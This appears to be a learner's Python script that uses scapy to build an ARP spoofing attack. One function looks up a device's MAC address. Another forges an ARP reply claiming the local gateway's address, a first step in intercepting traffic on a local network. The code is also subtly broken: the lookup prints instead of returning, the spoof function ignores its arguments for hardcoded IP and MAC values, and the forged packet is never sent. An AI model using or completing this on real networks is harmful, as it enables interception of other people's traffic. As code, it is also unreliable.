import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
# this line will return 2 lists, answered and unanswered.Timeout will specify time to request
    answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    #for request
    # print(answered_list[0][0].hwsrc)
    #for response
    print(answered_list[0][1].hwsrc)
    # return answered_list[0][1].hwsrc
def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    # this is how packet made of
    packet = scapy.ARP(op=2, pdst="192.168.0.117",hwdst="60:a4:d0:b9:70:74",psrc="192.168.0.1")
    #if we dont specify hwsrc,it will be detected automatically and if we dont specify "op" then it will take 1 value
    #op = 1 is request and op=2 is for response

    #packet all information
    print(packet.show())
    #who sent ip+mac
    print(packet.summary())
    #it will send the packet to target device with new mac address of this device

get_mac("192.168.0.1")